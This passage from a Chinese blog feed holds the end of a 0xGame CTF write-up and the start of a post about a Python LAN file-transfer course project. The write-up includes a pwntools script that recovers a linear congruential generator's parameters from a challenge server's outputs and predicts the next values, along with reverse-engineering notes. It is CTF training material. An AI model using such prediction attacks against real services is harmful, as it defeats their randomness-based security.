class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span>了。求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>以后，就可以根据<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_1,x_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>很快地求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>。</p><p>在整个做题的过程中，可能有人查看了百度的方法，结果到最后预测错了。原因很简单：因为这边只是有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>D</mi><mn>1</mn></msub><mi>p</mi><mo separator="true">,</mo><msub><mi>D</mi><mn>2</mn></msub><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\gcd(D_1p,D_2p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span>，虽然<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span>是一定的，但<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>D</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>D</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\gcd(D_1,D_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的值却不为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。有两种办法解决：一是多选取几组数据，求公约数更保险，二是我测了一下，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>D</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>D</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\gcd(D_1,D_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的值实际上并不大（很大概率小于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1000</mn></mrow><annotation encoding="application/x-tex">1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span></span></span></span>），因此可以写个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>999</mn></mrow><annotation encoding="application/x-tex">999</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">9</span><span class="mord">9</span><span class="mord">9</span></span></span></span>的循环，将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>gcd</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>D</mi><mn>1</mn></msub><mi>p</mi><mo separator="true">,</mo><msub><mi>D</mi><mn>2</mn></msub><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\gcd(D_1p,D_2p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span style="margin-right:0.01389em;">g</span>cd</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span>里面多余的因数除掉即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.101.38.213"</span><span class="token punctuation">,</span><span class="token number">60709</span><span class="token punctuation">)</span>u<span class="token punctuation">,</span>detla<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b">"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b">"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>    numb<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    numb<span class="token operator">=</span>numb<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b"is"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    u<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>numb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    detla<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>u<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>u<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">-</span>u<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>u<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token operator">=</span>detla<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> detla<span class="token punctuation">:</span>    p<span class="token operator">=</span>GCD<span class="token punctuation">(</span>p<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">assert</span> isPrime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">-</span>u<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span>inverse<span class="token punctuation">(</span>u<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>u<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token operator">%</span>pb<span class="token operator">=</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token operator">*</span>u<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>p<span class="token punctuation">)</span>x<span class="token operator">=</span>u<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">205</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">15</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    x<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token operator">*</span>x<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token operator">%</span>p    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b">"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b">"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"0xGame&#123;"</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"0xGame&#123;"</span><span class="token operator">+</span>flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>0xGame&#123;86767788-6000-7608-6777-5454a581d836&#125;</code></p><h2 id="reverse">Reverse</h2><h3 id="mirror">Mirror</h3><p>先脱壳upx</p><p>本质为一个解方程</p><p>可能就只是反编译出来的代码比较难看，建议直接看汇编代码，更容易理解运行过程</p><p>方程使用z3解一下就是</p><p>然后就是一些简单的异或运算了 很简单</p><p>z3计算方程脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string">'x%d'</span><span class="token operator">%</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string">'u%d'</span><span class="token operator">%</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span>n1 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'n1'</span><span class="token punctuation">)</span>n2 <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'n2'</span><span class="token punctuation">)</span>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>n1 <span class="token operator">>=</span> <span class="token operator">-</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>n1 <span class="token operator">&lt;=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>n1 <span class="token operator">>=</span> <span class="token operator">-</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>n1 <span class="token operator">&lt;=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1969444366</span> <span class="token operator">*</span> <span class="token number">1969444366</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1820452491</span> <span class="token operator">==</span> <span class="token number">310</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">310</span> <span class="token operator">*</span> <span class="token number">310</span> <span class="token operator">+</span> n1<span class="token punctuation">)</span> <span class="token operator">+</span> n2<span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2963569549</span> <span class="token operator">*</span> <span class="token number">2963569549</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1719772226</span> <span class="token operator">==</span> <span class="token number">704</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">704</span> <span class="token operator">*</span> <span class="token number">704</span> <span class="token operator">+</span> n1<span class="token punctuation">)</span> <span class="token operator">+</span> n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>res <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>n1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>n2<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="installer">Installer</h3><p>pyc反编译，<code>uncompyle6</code>使用一下</p><p><code>uncompyle6 -o test.py test.pyc</code></p><p>剩下简单异或运算，脚本很简单就不放了</p><h3 id="maze">Maze</h3><p>简单的走地图游戏，起点坐标为<code>2 , 4</code></p><p>终点坐标为<code>5， 4</code></p><p>路径只有一条，直接走</p><p>需要先输入起点坐标</p><p>然后输入<code>w a s d</code> 上下左右行走</p><p>最后判断达到结尾<code>E</code></p><p><code>flag</code> 结果为 结果坐标 + 路径</p><pre class="line-numbers language-none"><code class="language-none">**********************************..........********S......********.***********************.***********************.********E***********....********.****........***********.****.******************.****.******************.****........***********.***********.***********.***********.***********.***********...*********.*************.*********...............*****************************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络实训之简单文件传输系统器</title>
      <link href="/2022/09/08/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%99%A8/"/>
      <url>/2022/09/08/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>只能说计算机网络实训那一周我是真的难受，不仅仅有我自己的实训任务还有别人的，自己这个任务一实际上是第一天就写完了的，大部分的时间是在做网络的一些内容，以及同组其他成员的可视化。</p><hr><p>[TOC]</p><h2 id="简单文件传输系统器"><a href="#简单文件传输系统器" class="headerlink" title="简单文件传输系统器"></a>简单文件传输系统器</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本文件传输系统为一款实现内网文件传输的类FTP协议软件，由Python语言开发。客户端程序与服务器端程序分别运行局域网内不同主机上，实现客户端与服务器端的文件传输功能。</p><h3 id="服务器界面："><a href="#服务器界面：" class="headerlink" title="服务器界面："></a>服务器界面：</h3><center><img src="./简单文件传输器/wps1.jpg"style="zoom:80%;" /><center> <center>图1-1 文件传输系统服务端</center>该界面包括开始等待下载按钮和选择共享文件夹按钮。<p>本程序是一款通过服务器客户端的方式实现一个类FTP协议下载功能的应用软件。</p><center><img src="./简单文件传输器/wps2.jpg" style="zoom:80%;" /> </center><center>图1-2 共享文件夹选择页面</center>点击选择共享文件夹按钮后，路径选择界面，选择文件夹作为共享文件夹，客户端可以自由获取该文件夹下的文件。同时服务器端会读取当前共享文件夹路径下的所有文件名，写入文件菜单.txt中。<p>在选择好共享文件后，点击开始等待下载，程序通过点击，服务器进入被动等待，同时服务器会进行弹窗展示自己的IP地址（内网地址）</p><center><img src="./简单文件传输器/wps3.jpg" style="zoom:80%;" /> </center><center>图1-3 弹窗显示服务器内网IP地址</center>在此之后，服务器端将等待客户端与其建立连接，连接建立后将持续等待客户端发送文件下载请求，但同一时间只能与一个客户端建立连接。<h3 id="客户端界面"><a href="#客户端界面" class="headerlink" title="客户端界面"></a>客户端界面</h3><p>首先运行客户端后，会进入客户端页面，如图2-1所示。 </p><center><img src="./简单文件传输器/wps4.jpg" style="zoom:80%;" /> </center><center>图2-1 客户端页面</center>该界面包括对应的服务器IP地址输入栏，文件输入栏。还有下载按钮和文件存放地址设置按钮。在服务器开启后依次输入输入服务器IP地址，与需要下载的文件，设置文件存放地址，点击下载程序将自动链接服务器，下载需下载的文件。<p>执行程序时，应先下载文件菜单.txt文件，以获悉共享文件夹下的内容。</p><p>当文件完成下载时会进行弹窗提示，用户可继续通过当前客户端下载服务器共享文件夹下的其他文件。</p><center><img src="./简单文件传输器/wps5.jpg" style="zoom:80%;" /> </center><center>图2-2文件下载完成后的相应提示</center>### 开发环境<p>本项目使用Python语言开发，使用 PyCharm编译器进行开发。使用WxPython库进行可视化界面制作，同时以socket,Json，struct等支持库进行服务器与客户端的链接。</p><p>在开发过程中，客户端程序与服务器端程序分开进行开发。</p><h3 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h3><ol><li><p>在使用时请在服务器地址下放置需要客户端下载的内容</p></li><li><p>由于使用支持库socket的限制，本程序只能实现在同一子网下不同主机间的通信，无法实现对内网的穿透实现外网通信。</p></li><li><p>由于windows计算机防火墙的存在，在设计传输程序的过程中，一直选用8000端口作为通信端口，同时手动开启服务器该端口号，只有服务器固定端口号打开时程序才能顺利运行。</p></li><li><p>客户端输入IP地址应为局域网内的内网地址，即程序运行过程中服务器端提示地址（原因见注意事项1）。</p></li><li><p>在实际应用时，进行了一些简单的过滤，避免客户端通过简单注入即可危害服务器信息安全（读取到不应读取的内容）。</p></li></ol><h3 id="服务器代码："><a href="#服务器代码：" class="headerlink" title="服务器代码："></a>服务器代码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> struct  <span class="token comment"># 制作报头的模块</span><span class="token keyword">import</span> json   <span class="token comment"># 转换数据格式(序列化)</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">getIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"8.8.8.8"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip<span class="token operator">=</span>s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> ip<span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>ip<span class="token operator">=</span>getIP<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">)</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'简单文件传输器（服务器）'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">360</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token 